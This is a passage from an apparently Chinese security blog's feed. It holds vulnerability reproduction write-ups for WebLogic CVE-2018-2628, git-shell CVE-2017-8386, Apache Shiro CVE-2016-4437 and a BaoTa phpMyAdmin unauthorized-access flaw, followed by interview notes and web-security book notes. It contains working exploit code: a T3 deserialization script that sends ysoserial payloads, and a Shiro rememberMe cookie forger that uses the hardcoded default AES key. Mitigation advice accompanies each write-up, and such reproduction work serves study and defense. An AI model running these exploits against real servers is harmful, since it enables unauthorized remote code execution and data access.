punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>        <span class="token keyword">pass</span>    <span class="token keyword">return</span> res<span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span>dip<span class="token punctuation">,</span> dport<span class="token punctuation">,</span> path_ysoserial<span class="token punctuation">,</span> jrmp_listener_ip<span class="token punctuation">,</span> jrmp_listener_port<span class="token punctuation">,</span> jrmp_client<span class="token punctuation">)</span><span class="token punctuation">:</span>    sock <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>    sock<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span><span class="token number">65</span><span class="token punctuation">)</span>    server_addr <span class="token operator">=</span> <span class="token punctuation">(</span>dip<span class="token punctuation">,</span> dport<span class="token punctuation">)</span>    t3_handshake<span class="token punctuation">(</span>sock<span class="token punctuation">,</span> server_addr<span class="token punctuation">)</span>    build_t3_request_object<span class="token punctuation">(</span>sock<span class="token punctuation">,</span> dport<span class="token punctuation">)</span>    payload <span class="token operator">=</span> generate_payload<span class="token punctuation">(</span>        path_ysoserial<span class="token punctuation">,</span> jrmp_listener_ip<span class="token punctuation">,</span> jrmp_listener_port<span class="token punctuation">,</span> jrmp_client<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"payload: "</span> <span class="token operator">+</span> payload<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    rs <span class="token operator">=</span> send_payload_objdata<span class="token punctuation">(</span>sock<span class="token punctuation">,</span> payload<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'response: '</span> <span class="token operator">+</span> rs<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'exploit completed!'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token comment"># check for args, print usage if incorrect</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">7</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\nUsage:\nexploit.py [victim ip] [victim port] [path to ysoserial] '</span>              <span class="token string">'[JRMPListener ip] [JRMPListener port] [JRMPClient]\n'</span><span class="token punctuation">)</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>    dip <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    dport <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    path_ysoserial <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>    jrmp_listener_ip <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span>    jrmp_listener_port <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span>    jrmp_client <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span>    exploit<span class="token punctuation">(</span>dip<span class="token punctuation">,</span> dport<span class="token punctuation">,</span> path_ysoserial<span class="token punctuation">,</span> jrmp_listener_ip<span class="token punctuation">,</span>            jrmp_listener_port<span class="token punctuation">,</span> jrmp_client<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h4 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h4><ul><li>官方升级 <a href="http://www.oracle.com/technetwork/security-advisory/cpuapr2018-3678067.html">http://www.oracle.com/technetwork/security-advisory/cpuapr2018-3678067.html</a></li><li>临时防护方案<ol><li>进入Weblogic控制台，在base_domain的配置页面中，进入“安全”选项卡页面，点击“筛选器”，进入连接筛选器配置。</li><li>在连接筛选器中输入：weblogic.security.net.ConnectionFilterImpl，在连接筛选器规则中输入：* * 7001 deny t3 t3s</li><li>保存后规则即可生效，无需重新启动。</li></ol></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> Weblogic WLS Core Components 反序列化命令执行漏洞 </tag>
            
            <tag> CVE-2018-2628 </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> 命令执行 </tag>
            
            <tag> Weblogic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GIT-SHELL 沙盒绕过（CVE-2017-8386）</title>
      <link href="//lou-dong-fen-xi/git-shell-sha-he-rao-guo-cve-2017-8386/"/>
      <url>//lou-dong-fen-xi/git-shell-sha-he-rao-guo-cve-2017-8386/</url>
      
        <content type="html"><![CDATA[<h3 id="GIT-SHELL-沙盒绕过（CVE-2017-8386）"><a href="#GIT-SHELL-沙盒绕过（CVE-2017-8386）" class="headerlink" title="GIT-SHELL 沙盒绕过（CVE-2017-8386）"></a>GIT-SHELL 沙盒绕过（CVE-2017-8386）</h3><h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><ul><li>Git 2.4.12之前的版本</li><li>Git 2.5.6之前的2.5.x版本</li><li>Git 2.6.7之前的2.6.x版本</li><li>Git 2.7.5之前的2.7.x版本</li><li>Git 2.8.5之前的2.8.x版本</li><li>Git 2.9.4之前的2.9.x版本</li><li>Git 2.10.3之前的2.10.x版本</li><li>Git 2.11.2之前的2.11.x版本</li><li>Git 2.12.3之前的2.12.x版本</li></ul><h4 id="受影响的产品"><a href="#受影响的产品" class="headerlink" title="受影响的产品"></a>受影响的产品</h4><ul><li>Ubuntu Linux 17.04</li><li>Ubuntu Linux 16.10</li><li>Ubuntu Linux 16.04 LTS</li><li>Ubuntu Linux 14.04 LTS</li><li>Debian Linux 8.0 (Jessie)</li><li>Fedora 24</li><li>Fedoraproject Fedora 25</li><li>Fedoraproject Fedora 26</li><li>Novell Leap 42.1</li><li>Opensuse Leap 42.1</li><li>GIT 2.12</li><li>GIT 2.11</li><li>GIT 2.10</li></ul><h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>GIT-SHELL 沙盒绕过（CVE-2017-8386）导致任意文件读取、可能的任意命令执行漏洞。</p><h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>执行<code>git-upload-archive --help</code>（或<code>git-receive-pack --help</code>），将会进入一个交互式的man页面，man又调用了less命令，less命令有一个特性，就是其支持一些交互式的方法。比如在less页面中，按<code>shift</code>+e可以打开Examine功能，通过这个功能可以读取任意文件；输入<code>!id</code>就可以执行id这个命令。</p><p>如果目标服务器使用了第一种方法，我们即使成功执行了<code>git-upload-archive '--help'</code>进入帮助页面，也不能执行命令。因为<code>!id</code>还是在git-shell下执行，git-shell中没有id命令，所以依旧执行不成功。</p><p>但读取文件是一定可以的，因为读取文件不是通过命令读取的，所以不受git-shell沙盒的影响。</p><p>如果目标服务器是用第二种方法配置的git-shell，在<code>/etc/passwd</code>文件设置git用户的shell是bash，而在authorized_keys中覆盖command，执行git-shell。</p><p>这种情况下，如果我进入了帮助页面，输入<code>!id</code>是可以成功执行id命令的，因为此时id是在bash下执行的，而不是在git-shell下执行的，所以没有沙盒限制。</p><h4 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h4><ul><li>更新Git</li><li>安装系统安全更新</li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GIT-SHELL 沙盒绕过 </tag>
            
            <tag> CVE-2017-8386 </tag>
            
            <tag> CVE </tag>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）复现</title>
      <link href="//lou-dong-fen-xi/apache-shiro-1.2.4-fan-xu-lie-hua-lou-dong-cve-2016-4437-fu-xian/"/>
      <url>//lou-dong-fen-xi/apache-shiro-1.2.4-fan-xu-lie-hua-lou-dong-cve-2016-4437-fu-xian/</url>
      
        <content type="html"><![CDATA[<h3 id="Apache-Shiro-1-2-4反序列化漏洞（CVE-2016-4437）"><a href="#Apache-Shiro-1-2-4反序列化漏洞（CVE-2016-4437）" class="headerlink" title="Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）"></a>Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）</h3><h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><ul><li>Apache Shiro &lt;= 1.2.4</li></ul><h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>Apache Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。</p><p>Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。</p><h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>Apache Shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：得到rememberMe的cookie值 &gt; Base64解码–&gt;AES解密–&gt;反序列化。然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。</p><h4 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征"></a>漏洞特征</h4><p>返回包的 Set-Cookie 中存在 rememberMe=deleteMe 字段。</p><h4 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h4><ol><li><p>构造payload</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">import</span> uuid<span class="token keyword">import</span> base64<span class="token keyword">import</span> subprocess<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES<span class="token keyword">def</span> <span class="token function">encode_rememberme</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span>    popen <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'java'</span><span class="token punctuation">,</span> <span class="token string">'-jar'</span><span class="token punctuation">,</span> <span class="token string">'ysoserial-0.0.6-SNAPSHOT-all.jar'</span><span class="token punctuation">,</span> <span class="token string">'JRMPClient'</span><span class="token punctuation">,</span> command<span class="token punctuation">]</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span>    BS <span class="token operator">=</span> AES<span class="token punctuation">.</span>block_size    pad <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span> s <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>BS <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">%</span> BS<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>BS <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">%</span> BS<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>    key <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span><span class="token string">"kPH+bIxk5D2deZiIxcaaaA=="</span><span class="token punctuation">)</span>    iv <span class="token operator">=</span> uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">bytes</span>    encryptor <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span> iv<span class="token punctuation">)</span>    file_body <span class="token operator">=</span> pad<span class="token punctuation">(</span>popen<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    base64_ciphertext <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>iv <span class="token operator">+</span> encryptor<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>file_body<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> base64_ciphertext<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> encode_rememberme<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"rememberMe={0}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>payload<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>前台登录，注意需要勾选Remember Me ，截获数据包</p></li><li><p>使用生成的payload，替换请求中的cookie信息</p></li></ol><h4 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h4><ol><li>升级shiro到1.2.5及以上</li><li>现在使用的rememberMe的AES加密密钥泄露，请自己base64一个AES的密钥，或者利用官方提供的方法生成密钥org.apache.shiro.crypto.AbstractSymmetricCipherService#generateNewKey()</li></ol>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Apache Shiro 1.2.4反序列化漏洞 </tag>
            
            <tag> CVE-2016-4437 </tag>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>宝塔后门-数据库未授权访问漏洞</title>
      <link href="//lou-dong-fen-xi/bao-ta-hou-men-shu-ju-ku-wei-shou-quan-fang-wen-lou-dong/"/>
      <url>//lou-dong-fen-xi/bao-ta-hou-men-shu-ju-ku-wei-shou-quan-fang-wen-lou-dong/</url>
      
        <content type="html"><![CDATA[<h3 id="宝塔后门-数据库未授权访问漏洞"><a href="#宝塔后门-数据库未授权访问漏洞" class="headerlink" title="宝塔后门-数据库未授权访问漏洞"></a>宝塔后门-数据库未授权访问漏洞</h3><h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><ul><li><p>宝塔Linux版本 7.4.2版本</p></li><li><p>宝塔Linux测试版本 7.5.14版本</p></li><li><p>宝塔Windows版 6.8版本</p></li></ul><h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>攻击者可以直接通过访问 http://网站IP:888/pma的方式。直接登录数据库后台管理页面。</p><p>宝塔是默认安装phpMyAdmin（数据库管理后台）并开启了888端口。而 phpMyAdmin 没有验证用户是否；拥有访问数据库的权限，就直接对用户放行所造成的漏洞。</p><h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>如果传入了username和password的情况下，宝塔会改写phpmyadmin的配置文件config.inc.php，将认证方式改成config，并写死账号密码。</p><h4 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests domain <span class="token operator">=</span> <span class="token string">'url'</span>payload <span class="token operator">=</span> <span class="token string">':888/pma'</span>url <span class="token operator">=</span> domain<span class="token operator">+</span>payload response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"漏洞存在！"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"可能不存在"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h4><h4 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h4><ol><li><p>升级到宝塔最新版</p></li><li><p>关闭888端口</p></li></ol><p>离线升级步骤：</p><ol><li>下载离线升级包：<a href="http://download.bt.cn/install/update/LinuxPanel-7.4.3.zip">http://download.bt.cn/install/update/LinuxPanel-7.4.3.zip</a></li><li>将升级包上传到服务器中的/root目录</li><li>解压文件：unzip LinuxPanel-7.4.3.zip</li><li>切换到升级包目录：cd panel</li><li>执行升级脚本：bash update.sh</li><li>删除升级包：cd .. &amp;&amp; rm -f LinuxPanel-7.4.3.zip &amp;&amp; rm -rf panel</li></ol>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 宝塔后门-数据库未授权访问漏洞 </tag>
            
            <tag> 漏洞分析 </tag>
            
            <tag> 宝塔 </tag>
            
            <tag> 未授权访问 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>面试杂谈</title>
      <link href="//blogs/mian-shi-za-tan/"/>
      <url>//blogs/mian-shi-za-tan/</url>
      
        <content type="html"><![CDATA[<p>聊一下这次技术面试的感受，最致命的问题是基础，对于一些漏洞没有很牢靠掌握，还有就是对一下敏感问题的交流。</p><p>面试官很好，问的很全面，最后也给了明确答复和我面试出现的问题。</p><span id="more"></span><h3 id="web漏洞"><a href="#web漏洞" class="headerlink" title="web漏洞"></a>web漏洞</h3><h4 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h4><p>原理</p><p>危害</p><p>利用</p><p>xss平台</p><h4 id="csrf与ssrf"><a href="#csrf与ssrf" class="headerlink" title="csrf与ssrf"></a>csrf与ssrf</h4><h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><h4 id="文件解析"><a href="#文件解析" class="headerlink" title="文件解析"></a>文件解析</h4><h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><h3 id="owaps-top10"><a href="#owaps-top10" class="headerlink" title="owaps top10"></a>owaps top10</h3><h3 id="中间件及漏洞"><a href="#中间件及漏洞" class="headerlink" title="中间件及漏洞"></a>中间件及漏洞</h3><h4 id="iis7-0-7-5文件解析"><a href="#iis7-0-7-5文件解析" class="headerlink" title="iis7.0/7.5文件解析"></a>iis7.0/7.5文件解析</h4><h4 id="weblogic-csrf漏洞"><a href="#weblogic-csrf漏洞" class="headerlink" title="weblogic csrf漏洞"></a>weblogic csrf漏洞</h4><h4 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h4><h3 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h3><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><h3 id="渗透框架"><a href="#渗透框架" class="headerlink" title="渗透框架"></a>渗透框架</h3><h4 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h4><h4 id="cs"><a href="#cs" class="headerlink" title="cs"></a>cs</h4><h3 id="漏洞复现及靶场搭建"><a href="#漏洞复现及靶场搭建" class="headerlink" title="漏洞复现及靶场搭建"></a>漏洞复现及靶场搭建</h3><h3 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h3><p>vnc服务</p><p>3389</p>]]></content>
      
      
      <categories>
          
          <category> blogs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>笔记——《黑客攻防技术宝典（web实战篇）》</title>
      <link href="//booknote/hei-ke-gong-fang-ji-zhu-bao-dian-web-shi-zhan-pian/hei-ke-gong-fang-ji-zhu-bao-dian-web-shi-zhan-pian/"/>
      <url>//booknote/hei-ke-gong-fang-ji-zhu-bao-dian-web-shi-zhan-pian/hei-ke-gong-fang-ji-zhu-bao-dian-web-shi-zhan-pian/</url>
      
        <content type="html"><![CDATA[<p>这是我读过的关于信息安全的读书笔记。</p><span id="more"></span><h2 id="第一章-web-应用程序安全与风险"><a href="#第一章-web-应用程序安全与风险" class="headerlink" title="第一章 web 应用程序安全与风险"></a>第一章 web 应用程序安全与风险</h2><p><code>web应用程序面临的核心问题</code></p><ul><li>  <em>用户可提交任意输入</em></li><li>  <em>造成安全问题的各种因素</em></li></ul><blockquote><p>今日学习时间：2020/11/7 22:20-23:40 ，学习内容：web 实战 42-47 页，学习心得如下：</p></blockquote><h3 id="Web-应用程序的发展历程及安全威胁"><a href="#Web-应用程序的发展历程及安全威胁" class="headerlink" title="Web 应用程序的发展历程及安全威胁"></a>Web 应用程序的发展历程及安全威胁</h3><p> 早期阶段：网站内容基本是包含静态文档的信息库，信息流仅由服务器向浏览器单向传送，主要安全威胁是 web 服务器软件的漏洞；</p><p> 现阶段：网站大多是 web 应用程序，可以在服务器和浏览器之间双向信息传递，主要安全威胁是服务器存在敏感信息、web 应用程序开发者不能保证开发安全、web 应用程序与计算机系统连接紧密</p><p>web 应用程序的常用功能</p><ul><li>  购物（Amazon、taobao、jd、suning、pdd…）</li><li>  社交网络（Facebook、Instagram…）</li><li>  银行服务（Citibank、boc、abchnia、ccb、icbc…）</li><li>  web 搜索（Google、baidu、bing…）</li><li>  拍卖（eBay）</li><li>  博彩与投机（Betfair）</li><li>  博客（Blogger）</li><li>  web 邮件（Gmail、outlook…）</li><li>  交互信息（Wikipedia）</li><li>  新闻资讯（reuters、toutiao）</li><li>  视频（YouTube、youku、bilibili）</li><li>  云桌面、在线软件</li></ul><p>web 在组织内部的应用</p><ul><li>  组织成员管理（OA、HR…）</li><li>  资源管理（k8s、宝塔…）</li><li>  协同办公、云文档</li><li>  企业资源规划（ERP）</li><li>  web 邮件</li><li>  Google Apps、Microsoft Office Live</li></ul><p>web 应用程序的优点</p><ul><li>  使用 http 协议，轻量级、无连接、容错性、安全通信</li><li>  无需独立的客户端，服务端修改就可以在浏览器上生效</li><li>  浏览器功能强大，支持拓展</li><li>  web 应用开发相对简单</li></ul><h3 id="web-应用程序安全"><a href="#web-应用程序安全" class="headerlink" title="web 应用程序安全"></a>web 应用程序安全</h3><ul><li>  web 应用缺陷“与时俱进”，不能保证开发人员具有安全开发的能力</li><li>  web 浏览器的安全功能的加强，可以对<code>xss</code>、<code>csrf</code>等攻击有一定的阻力</li><li>  应用级拒绝服务攻击，<code>cc攻击</code>；网络级拒绝服务攻击，<code>Dos攻击</code>；分布式网络级拒绝服务攻击，<code>DDos攻击</code></li></ul><blockquote><p>今日学习时间：2020/11/8 18:00-21:00，学习内容：web 实战 48- 55 页，学习心得如下：</p></blockquote><h4 id="“本站点是安全的”"><a href="#“本站点是安全的”" class="headerlink" title="“本站点是安全的”"></a>“本站点是安全的”</h4><ul><li><p>SSL 无法保证 web 应用不被漏洞攻击，SSL 只能保证网络安全传输，不被中间人攻击利用</p></li><li><img src="/booknote/hei-ke-gong-fang-ji-zhu-bao-dian-web-shi-zhan-pian/hei-ke-gong-fang-ji-zhu-bao-dian-web-shi-zhan-pian/image-20201108181203063.png" class="" title="OWASP Top10"></li></ul><h4 id="核心安全问题：用户可提交任意输入"><a href="#核心安全问题：用户可提交任意输入" class="headerlink" title="核心安全问题：用户可提交任意输入"></a>核心安全问题：用户可提交任意输入</h4><p>应用程序无法控制客户端，用户几乎可以向服务器端应用提交任何输入。虽然可以使用 js 限制用户输入，但是 js 是可控的，服务端接收的任何数据都必须经过处理之后才能认为是安全的，可是这种处理可以对服务端的攻击，但不能防御对客户端的攻击，比如 xss，csrf 就是对客户端的攻击，而 ssrf、sql 注入这样的就针对服务端攻击。</p><p>可控输入</p><ul><li>  利用 http，修改请求头、请求体，cookie、参数等</li><li>  逻辑页面，正常逻辑的修改账号密码是 1.邮箱或手机验证 2.输入新的密码，但是如果第二个页面不需要第一个页面的限制的话，就可以直接访问第二个页面修改参数，直接修改密码</li><li>  burpsuite、python requests，各种抓包工具和利用编程语言的网络请求</li><li>  支付逻辑漏洞</li><li>  会话令牌窃取，xss 和 csrf 都是利用了令牌窃取</li><li>  利用应用程序处理过程的逻辑错误删除某些正常提交的参数（难道是变量覆盖，不明白什么疑似）</li><li>  sql 注入，owasp top1</li></ul><h4 id="关键问题因素"><a href="#关键问题因素" class="headerlink" title="关键问题因素"></a>关键问题因素</h4><p>主要是开发者原因，从主观和客观角度阐述为什么开发的应用可能存在安全问题。</p><ul><li>  缺乏安全开发经验</li><li>  使用第三方库存在安全问题</li><li>  防御不能和攻击抗衡，攻击和防御处在一个博弈下，就像超级病毒</li><li>  开发成本，时间、资源</li><li>  没有新的技术满足现阶段开发的要求</li><li>  功能越丰富，漏洞就越多，每一千行代码就有 14 个安全缺陷</li></ul><h4 id="新的安全边界"><a href="#新的安全边界" class="headerlink" title="新的安全边界"></a>新的安全边界</h4><p>和 web 应用有联系的都被划分进来，不再只是一台服务器而已。就个人理解和听到的一些看法，对内网安全大多数企业都很自信，认为攻击无法穿透防火墙，内网都是局域网，外部人员无法访问。看法没毛病，但是对内网的攻击几乎都是从内网发起的，外部网络无法直接连接进入内网，往往是有内网某终端发起的对外连接，特洛伊木马，内呼外应就能对内网攻击。防火墙的确可以阻止来自于外部网络的连接，添加策略即可，但很难不让内部访问外部网络，除非纯粹的内部网络，切断物理连接。</p><p>扯多了，新的安全边界包括应用本身、与应用数据相关的数据库、主机系统、第三方插件、甚至用户。web 应用本来就是让用户使用的，为了防御网络攻击切断网络层的连接确实也很有必要，waf 检测到来自一个 IP 的攻击就可以用网络级防火墙阻断连接。内部网络需要做很多策略来限制访问，对访问资源的限制，对主机的访问。</p><p>web 应用作为一个入口，访问内部网络，获取窃取用户数据或者攻击用户，这种情况下凡是使用具有潜在威胁 web 应用的用户都可能成为攻击者的目标或受害者。</p><h4 id="web-应用程序安全的未来"><a href="#web-应用程序安全的未来" class="headerlink" title="web 应用程序安全的未来"></a>web 应用程序安全的未来</h4><ul><li>  传统的安全问题虽然存在但是有了成熟的处理方案</li><li>  安全重心从服务端向客户端偏移</li><li>  新的技术出现，云、web2.0。这些技术的出现也带动了新的攻击方向，云安全也成了热门，的确云主机的出现能节约成本，但是鸡蛋在一个篮子里总有点担忧，云厂商在安全方面做了很大努力，对 DDos 的防御，还有阿里云高冗余的云服务，对数据有很大保证。曾经的服务端也变成了客户端，安全边界又发生了改变</li></ul><blockquote><p>第一章总结</p><p>web 应用是很多攻击的入口，安全边界包含的主体都可能成为攻击的协助者和受害者，很多攻击都是旁路的，第三方插件等。web 应用的安全问题很大原因是开发时期问题，安全开发经验、开放框架、开发成本、开发技术、还有防御策略。</p><p>云服务的出现给 web 应用提供了更安全的保障，但云安全也随之出现。</p></blockquote><h2 id="第二章-核心防御机制"><a href="#第二章-核心防御机制" class="headerlink" title="第二章 核心防御机制"></a>第二章 核心防御机制</h2><blockquote><p>今日学习时间：2020/11/9 22:30-23:00，学习内容：web 实战 56-60 页，学习心得如下：</p></blockquote><p>web 应用程序防御机制：</p><ul><li>  处理用户访问</li><li>  处理用户输入</li><li>  预防御</li><li>  应用监控</li></ul><h3 id="处理用户访问"><a href="#处理用户访问" class="headerlink" title="处理用户访问"></a>处理用户访问</h3><p>用户可以分为匿名用户（游客）、普通用户、管理员，匿名用户只能对公共资源访问，只能使用应用少部分功能；普通用户是应用的主要使用者，会与应用做很多交互，服务器存贮着普通用户的个人信息或者资源；管理员就是对应用做维护，对应用资源做管理，权限最高。</p><ul><li><p>身份验证</p><p>  使用服务端认为只能是用户才拥有的凭证作为验证。身份验证不能识别到人，只能做凭证鉴别。</p></li><li><p>会话管理</p><p>  